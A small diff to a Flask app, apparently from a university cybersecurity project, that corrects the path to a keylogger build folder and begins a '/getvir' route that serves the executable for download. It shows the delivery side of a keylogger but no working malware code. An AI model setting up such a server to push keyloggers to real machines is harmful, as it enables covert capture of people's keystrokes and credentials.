@@ -4,7 +4,7 @@ import os
 app = Flask(__name__)
 
 # Percorso della directory remota contenente l'eseguibile
-remote_directory = r"C:\Users\picco\OneDrive\Desktop\università\magistrale\cybersec\keyloggerc\keylogger\keylogger\\bin\Debug\\net8.0-windows7.0"
+remote_directory = r"C:\Users\picco\OneDrive\Desktop\università\magistrale\cybersec\keyloggerc\keylogger\keylogger\bin\Debug\net8.0-windows7.0"
 
 @app.route('/getvir', methods=['GET'])
 def get_vir_executable():
